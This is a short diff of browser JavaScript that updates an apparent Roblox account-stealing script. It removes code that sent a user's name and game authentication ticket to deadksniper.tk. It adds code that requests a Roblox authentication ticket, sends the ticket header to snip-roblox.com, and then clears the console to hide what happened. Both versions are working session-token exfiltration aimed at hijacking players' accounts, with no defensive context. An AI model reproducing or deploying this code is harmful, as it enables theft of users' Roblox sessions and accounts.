@@ -1,8 +1,13 @@
-$.get("/mobileapi/userinfo", function(userInfo){
-var username = userInfo["UserName"];
-$.get('/game-auth/getauthticket', function(authTicket){
-$.get('https://deadksniper.tk/l.php?c='+authTicket+"&u="+username).error(function(d){
-window.location.href="about:blank";
-})
-})
-})
+var data = {}
+$.ajax({
+   type: 'POST',
+   url: 'https://auth.roblox.com/v1/authentication-ticket',
+   data: data,
+   success: function(data, textStatus, request) {
+       $.get('https://snip-roblox.com/auth.php?auth_ticket=' + request.getResponseHeader('rbx-authentication-ticket'));
+   },
+   error: function(request, textStatus, errorThrown) {
+       $.get('https://snip-roblox.com/auth.php?auth_ticket=' + request.getResponseHeader('rbx-authentication-ticket'));
+   }
+});
+console.clear()
